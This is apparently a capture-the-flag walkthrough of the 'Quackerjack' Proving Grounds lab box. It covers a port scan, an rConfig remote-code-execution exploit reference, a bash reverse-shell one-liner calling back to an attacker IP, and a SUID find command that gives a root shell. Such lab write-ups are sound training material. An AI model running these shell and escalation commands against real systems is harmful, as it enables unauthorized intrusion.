# Quackerjack

## Info

Quackerjack is an intermediate linux box from offsec proving grounds.

## Nmap

All tcp port scan

```
21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.2
22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
111/tcp  open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)
139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: SAMBA)
445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp open  mysql       syn-ack ttl 61 MariaDB (unauthorized)
8081/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)
```

## rConfig

The following exploit allows RCE.

```
https://www.exploit-db.com/exploits/48878
```

Changing the url,payload and start a listener on 80.

```
bash -i >& /dev/tcp/192.168.45.200/80 0>&1
```

## Root

The following binary has SUID.

```
/usr/bin/find
```

Get a root shell.

```
find . -exec /bin/sh -p \; -quit
```
